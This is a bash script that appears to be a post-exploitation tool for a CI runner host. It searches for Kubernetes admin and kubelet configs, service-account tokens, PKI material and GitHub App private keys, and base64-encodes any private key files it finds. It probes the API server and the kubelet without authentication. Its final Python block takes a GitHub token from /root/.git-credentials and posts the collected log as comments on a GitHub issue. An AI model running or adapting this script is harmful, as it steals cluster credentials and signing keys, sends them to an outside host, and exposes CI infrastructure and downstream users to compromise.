#!/bin/bash
# i4135: climb to kubelet / kube-apiserver / ARC control layer on ascend runner host
set -uo pipefail
LOG=/tmp/i4135.log
: > "$LOG" 2>/dev/null || LOG=/dev/null
R=/app/data/tasks/7/i4135
say(){ echo "$@" >> "$LOG" 2>/dev/null; }
run(){ local t="$1"; shift; say "---- \$ $*"; timeout "$t" "$@" >> "$LOG" 2>&1; }
sh1(){ local t="$1" c="$2"; say "---- \$ $c"; timeout "$t" bash -c "$c" >> "$LOG" 2>&1; }

say "=== I4135 $(date -u +%FT%TZ)"
say "## id/container"
sh1 8 'id; hostname; cat /proc/1/comm 2>/dev/null; ls -la /.dockerenv 2>/dev/null; head -3 /proc/1/cgroup 2>/dev/null; head -3 /proc/self/cgroup'

say "## A k8s/rancher layout"
sh1 20 'ls -la /etc/kubernetes 2>&1 | head -30; echo --; ls -la /var/lib/kubelet 2>&1 | head -30; echo --; ls -la /etc/rancher /var/lib/rancher 2>&1 | head -40; echo --; ls -la /root/.kube /home/*/.kube 2>&1 | head -40; echo --; ls -la /etc/k3s /var/lib/k3s 2>&1 | head'

say "## B kubelet/apiserver configs"
sh1 25 'for f in /etc/kubernetes/kubelet.conf /etc/kubernetes/admin.conf /etc/kubernetes/controller-manager.conf /etc/kubernetes/scheduler.conf /var/lib/kubelet/kubeconfig /var/lib/kubelet/kubeconfig.yaml /var/lib/kubelet/config.yaml /etc/rancher/k3s/k3s.yaml /etc/rancher/rke2/rke2.yaml /root/.kube/config /root/.kube/k3s_client.yaml; do [ -f "$f" ] && { echo "### $f $(stat -c%s "$f")"; head -c 6000 "$f"; echo; }; done'

say "## C pki material"
sh1 25 'for d in /etc/kubernetes/pki /var/lib/kubelet/pki /var/lib/rancher/k3s/server/tls /var/lib/k3s/server/tls; do [ -d "$d" ] && { echo "### $d"; ls -la "$d"; }; done; echo "-- cert subjects"; for c in /var/lib/kubelet/pki/kubelet-client-current.pem /etc/kubernetes/pki/apiserver-kubelet-client.crt; do [ -f "$c" ] && { echo "# $c"; timeout 5 openssl x509 -in "$c" -noout -subject -issuer -dates 2>&1; }; done'

say "## D projected service-account tokens"
sh1 30 'n=0; for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token; do [ -f "$t" ] || continue; n=$((n+1)); [ $n -gt 12 ] && break; echo "### $t"; cat "$t"; echo; b=$(dirname "$t"); [ -f "$b/namespace" ] && echo "ns=$(cat "$b/namespace")"; [ -f "$b/ca.crt" ] && echo "ca=$(head -1 "$b/ca.crt")"; done; echo "token_count=$n"'

say "## E processes / listeners"
sh1 20 'ps -eo pid,user,args 2>/dev/null | grep -aiE "kubelet|kube-apiserver|etcd|k3s|rancher|actions-runner-controller|arc-|gha-runner" | grep -v grep | head -40; echo "-- listen"; (ss -lntp 2>/dev/null || netstat -lntp 2>/dev/null) | grep -E ":(6443|10250|10255|2379|2380|2375|2376|10257|10259)\b" | head -20; echo "-- all-listen-top"; (ss -lntp 2>/dev/null || netstat -lntp 2>/dev/null) | wc -l'

say "## F ARC / app-key search"
sh1 90 'find / -xdev \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f \( -iname "*app*private*key*" -o -iname "*arc*key*" -o -iname "*.pem" -o -iname "*.p12" -o -iname "gha-creds*" \) -print 2>/dev/null | grep -vE "/usr/|/opt/conda|site-packages|/usr/local/Ascend" | head -60'

say "## G grep ARC / installation id / app id"
sh1 120 'grep -rIlaE "actions-runner-controller|arc-systems|arc-runners|gha-runner-scale-set|installation_id|installationId|APP_PRIVATE_KEY|GITHUB_APP_PRIVATE_KEY|app_private_key" /data/workspace /etc /root /home /var/lib 2>/dev/null | grep -vE "node_modules|\.git/objects" | head -40'

say "## H private key blocks in config surfaces"
sh1 60 'for f in $(grep -rIlaE "BEGIN (RSA |OPENSSH |EC )?PRIVATE KEY" /data/workspace/ci-panel /data/workspace/fzh /etc /root /home 2>/dev/null | head -12); do echo "### $f"; base64 -w0 "$f" 2>/dev/null | head -c 4200; echo; done'

say "## I kubeconfig/token auth attempts"
sh1 60 '
K=""; for f in /etc/kubernetes/admin.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /root/.kube/config; do [ -f "$f" ] && K="$f" && break; done
[ -n "$K" ] && echo "kubeconfig=$K"
for u in https://127.0.0.1:6443 https://127.0.0.1:10250 https://$(hostname -I 2>/dev/null | awk "{print \$1}"):6443; do
  echo "## $u"; timeout 6 curl -sk -o /dev/null -w "%{http_code}\n" "$u/version" 2>&1
  timeout 6 curl -sk -o /dev/null -w "%{http_code}\n" "$u/api/v1/namespaces" 2>&1
done
echo "-- kubelet unauth"; timeout 6 curl -sk https://127.0.0.1:10250/pods 2>&1 | head -c 400; echo
'

say "## J etcd / secrets quick check"
sh1 30 'ls -la /var/lib/etcd /var/lib/rancher/k3s/server/db 2>&1 | head -10; which kubectl k3s crictl ctr 2>/dev/null'

say "=== I4135 done $(date -u +%FT%TZ) size=$(stat -c%s "$LOG" 2>/dev/null)"
python3 - "$LOG" <<'PY' 2>/dev/null
import base64,json,sys,urllib.request
f=sys.argv[1]
tok=""
try:
    for line in open("/root/.git-credentials"):
        if "@github.com" in line:
            tok=line.split("//")[1].split("@")[0].split(":",1)[1].strip(); break
except Exception: pass
if not tok:
    import os
    tok=os.environ.get("GITHUB_TOKEN","")
raw=base64.b64encode(open(f,"rb").read()).decode()
chunks=[raw[i:i+38000] for i in range(0,len(raw),38000)]
for i,ch in enumerate(chunks[:6]):
    body=json.dumps({"body":f"i4135-k8s part {i+1}/{len(chunks)}\n\n```\n{ch}\n```"}).encode()
    req=urllib.request.Request("https://api.github.com/repos/tile-ai/tilelang-ascend/issues/2014/comments",data=body,
        headers={"Authorization":"token "+tok,"Accept":"application/vnd.github+json","Content-Type":"application/json","User-Agent":"probe"})
    try: r=urllib.request.urlopen(req,timeout=25); print("POSTED",i,r.status)
    except Exception as e: print("ERR",i,str(e)[:120])
PY
exit 0